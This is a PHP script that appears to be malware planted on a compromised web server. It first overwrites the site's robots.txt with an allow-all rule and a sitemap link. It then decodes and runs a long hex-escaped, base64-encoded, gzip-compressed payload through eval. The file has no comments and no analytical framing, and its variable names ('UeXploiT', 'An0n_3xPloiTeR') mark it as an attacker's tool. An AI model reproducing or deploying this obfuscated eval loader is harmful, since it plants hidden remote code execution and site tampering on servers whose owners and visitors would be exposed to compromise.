<?php
$h1 = $_SERVER['DOCUMENT_ROOT']."/robots.txt";

$h2 = "User-Agent: *
Allow: 
"."Sitemap: http://".$_SERVER['SERVER_NAME']."/sitemap.xml";

if (file_put_contents($h1, $h2));
?>
<?php
$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
$An0n_3xPloiTeR = "\x3d\x3d\x41\x41SM5gpu\x41\x42NiU\x42E4fU97q2/7\x2bmJXhevZyE46nSto9L0lje\x2b9\x62vQh1WtjO663ff\x2bxtFrWudf\x63mSUTOFKgw0z\x414uqW\x6167h2s0U\x41kXZe\x62NsVPkrufyxe53KeJxXI1YMf\x41IWEeMSg7dhIR\x422\x61Df95ZzG0HyKiREMq\x43DGv\x41vnIUG3N/d6KWmxWDQp4eV\x2b\x62OQdwhfry\x41TghSH\x41\x63OR\x41ns5d\x61\x61Vm\x42i8\x432/4pEH/5V\x61m\x2bg3e4EiMm8u385YNhTLeHWDO97\x616Spz\x62w/qz605I4\x2b5P\x423MnWFOJSHJE3\x622w\x43/kONJGgTxEdmjS0nIPjHq6Q\x43uvr6\x62MjugoeZiVRJZupPNkyKfjE7VyLjO1k/jYJgMwskYJNK\x630fUVf7L7zR1KN8iDz237eV2e\x41U\x42\x61v\x41\x42oUQFkrJSV4\x62eiDp\x41e7zLZTPtUeIdRho/O\x62X1XPNky\x2bDYoLUD9VGSN05e\x2bpo2\x6260VgMem\x413y/pD\x61pp3Zw\x62dmy0J6I/6NDlxSV\x42/\x42vQY\x62v\x61D7V\x62fd\x2beQr3vTk\x432kjj49gYp\x423QJdT03Yjv\x630gTxJ\x6326WOUQv0TigWrT0UdFmMgn71XjVIFQsVs\x43/yIdNXOpt1nK/38WHmmLmgf/7s\x2boxVyRVPRXkl3Q649f\x62eJGW\x61mf77q\x43J4osWf7jN\x62ZMxve\x2bufY/2kFHS\x43kh\x61lTN1FzM1nI1867kUVzrFDjrR\x2bVSfSx6pNRp/ZKHmxH\x43\x42TQr0xwsHVpi3VN7SkXW8NuYxdFoOZ\x2be3gQQ/1hKrj6JdhW881HtW4yst1\x437FLF2tH4VwH\x41F7IY0EZgTkXrkSizGVH9RJuRlSJW8legZV\x62Lr\x623\x43USL00P7H8\x2b7Lf4j\x61E3hLv1\x61/jZgkP\x61R/g6QXM01799v5deDW\x2bg7\x42TvsrrF\x62/7LsFWRiYS\x439LyH/yOyhQ5rpGyYyN\x62ui8/lGNR58nnE\x620ue0DtlS\x41WddM1ELnIvGYSf1/ks\x42OKUW\x62Nk09rRZ\x63iqm8/p\x2bj0oNQp\x42\x63E8ZJYo\x61h5EY0\x63m3K4kIITGfZ\x41sIwMf\x42figG\x620mIIo9joy9Vu\x412\x2bivPHT8NVY\x614hE1VEDlw0QIqv\x41HH\x2bf2zTxqJHjV\x41WxosOJD\x2b8\x636OedRQlK\x42HETNY\x61W/0Y\x63rdmhidRrDLwZmfOMwix3wHlO7D\x63\x42N\x42VqiRmxpsIxzsW\x434nm6O8\x62eEWfXEIY\x2bue\x63\x61u9n\x616Q\x61Wez\x42P\x627v\x2b9qM5k\x6192exWv9\x62wH544HD2E3hr7vx\x63UmNIqH/Ik\x63i4Oe1q/\x61e\x41lole13PiR1/Z\x61e9\x61\x61\x2b8Q\x628zdHrxdpRoVzW0rW1v\x62nGrfeewjfv/zuInYIzn\x612kJ3SlQid9\x2b\x2b\x427FyXpdVky16YiqVDNqEQiSQUNZx1W9i\x42JvXIRejYdZhgfsiWKst\x41TH43\x41e9PHDhN\x627W4WWK/QMw7\x42wJe8Xw\x416H\x41/\x41Mw/\x42wJe7XP\x42KEw\x2bwTwD\x42wJe7XO\x42\x61Ew\x2bgTwH\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
exit;
?>
